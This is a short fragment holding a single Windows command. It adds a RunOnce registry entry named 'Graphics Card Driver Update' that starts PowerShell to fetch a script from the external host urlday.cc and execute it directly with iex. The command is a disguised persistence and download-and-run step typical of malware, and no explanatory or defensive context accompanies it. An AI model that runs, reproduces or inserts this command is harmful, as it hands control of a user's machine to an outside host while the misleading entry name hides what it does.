...
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce /v "Graphics Card Driver Update" /t REG_SZ /d "powershell.exe 'iwr -useb urlday.cc/micro|iex;pause'" /f
